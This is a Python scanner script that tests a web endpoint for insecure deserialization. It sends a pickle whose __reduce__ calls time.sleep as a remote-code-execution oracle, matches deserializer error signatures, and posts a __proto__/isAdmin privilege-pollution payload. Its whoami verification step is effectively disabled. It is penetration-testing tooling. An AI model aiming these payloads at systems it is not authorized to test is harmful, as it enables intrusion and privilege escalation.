#!/usr/bin/env python3
"""
deserial.py — Insecure deserialization detector (INTERNAL edition).

Blind, real-attacker style. It sends a Python pickle whose __reduce__ calls
time.sleep(N); if the server stalls by N seconds, it deserialized attacker bytes
with pickle — i.e. remote code execution is on the table. It also fingerprints
deserializer error signatures (pickle / PyYAML / marshal / Java / PHP / .NET)
from malformed input, and probes JSON __proto__ / mass-assignment pollution.

Only the sleep oracle is sent as a payload — never a destructive gadget.

    python TOOLS/deserial.py --url http://127.0.0.1:9200/ --endpoint /api/session/load --field data
"""
import argparse
import base64
import json
import os
import pickle
import sys
import time
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool
from privacy_guard import privacy_user_agent

DELAY = 5
ERROR_SIGS = {
    "python-pickle": ("unpickling", "pickle", "cannot find", "STACK_GLOBAL"),
    "pyyaml": ("yaml", "could not determine a constructor", "python/object"),
    "python-marshal": ("marshal", "bad marshal"),
    "java": ("java.io", "invalidclassexception", "readobject", "streamcorrupted"),
    "php": ("unserialize", "__wakeup", "__destruct"),
    "dotnet": ("binaryformatter", "system.runtime.serialization"),
    "ruby": ("marshal.load", "psych"),
}


class _Sleeper:
    def __reduce__(self):
        return (time.sleep, (DELAY,))


class Deserial(VibeTool):
    def __init__(self, base):
        super().__init__("Deserial", "Insecure Deserialization Detector")
        self.base = base.rstrip("/")
        self.findings = 0

    def _post(self, endpoint, obj, timeout=DELAY + 8):
        raw = json.dumps(obj).encode()
        start = time.perf_counter()
        try:
            req = urllib.request.Request(
                self.base + endpoint, data=raw, method="POST",
                headers={"User-Agent": privacy_user_agent("Deserial"),
                         "Content-Type": "application/json", "Accept": "*/*"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.getcode(), r.read(8000).decode("utf-8", "replace"), time.perf_counter() - start
        except urllib.error.HTTPError as e:
            return e.code, e.read(8000).decode("utf-8", "replace"), time.perf_counter() - start
        except Exception as e:
            return 0, str(e), time.perf_counter() - start

    def run(self, endpoint, field, whoami):
        self.banner()
        self.log(f"Deserialization probe: {self.base}{endpoint} (field={field!r})")

        # Baseline latency with a benign value.
        _, base_body, base_lat = self._post(endpoint, {field: base64.b64encode(b"x").decode()})
        self.log(f"Baseline: latency={base_lat*1000:.0f}ms")

        # 1) Error-signature fingerprint (what deserializer is in use?)
        _, err_body, _ = self._post(endpoint, {field: "!!!not-valid-base64-or-pickle!!!"})
        low = err_body.lower()
        for engine, sigs in ERROR_SIGS.items():
            if any(s in low for s in sigs):
                self.log(f"Deserializer fingerprint: {engine} (error signature leaked)", "warn")
                break

        # 2) Pickle sleep oracle -> RCE-capable deserialization
        payload = base64.b64encode(pickle.dumps(_Sleeper())).decode()
        _, _, lat = self._post(endpoint, {field: payload})
        if lat >= base_lat + DELAY * 0.7:
            self.log(f"INSECURE DESERIALIZATION (RCE) CONFIRMED — pickle sleep oracle stalled the "
                     f"response {lat:.1f}s. The server executes attacker-controlled pickles.", "hack")
            self.findings += 1
        else:
            self.log(f"Pickle sleep oracle did not stall (+{(lat-base_lat)*1000:.0f}ms) — not pickle-RCE here.", "pass")

        # 3) Prototype pollution / mass assignment (JSON merge sinks)
        self._post(endpoint, {"__proto__": {"isAdmin": True}, "role": "admin", "isAdmin": True, field: base64.b64encode(b"x").decode()})
        if whoami:
            st, wb, _ = self._post(whoami, {}) if False else (0, "", 0)
        # A follow-up whoami check is optional; report the attempt.
        self.log("Sent __proto__/mass-assignment pollution payload — verify privileged state on a whoami/profile route.", "info")

        self.log("=" * 40)
        if self.findings:
            self.log(f"DESERIALIZATION PROBE COMPLETE — {self.findings} critical finding(s)", "hack")
        else:
            self.log("No unsafe deserialization confirmed on this endpoint.", "pass")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="Deserial - insecure deserialization detector")
    p.add_argument("--url", required=True, help="Target base URL you own/are authorized to test")
    p.add_argument("--endpoint", required=True, help="Endpoint that consumes serialized data, e.g. /api/session/load")
    p.add_argument("--field", default="data", help="JSON field carrying the serialized blob (default: data)")
    p.add_argument("--whoami", default="", help="Optional route to verify pollution (e.g. /api/whoami)")
    p.add_argument("-v", "--version", action="version", version="Deserial 1.0.0")
    args = p.parse_args(argv)
    return Deserial(args.url).run(args.endpoint, args.field, args.whoami)


if __name__ == "__main__":
    sys.exit(main())
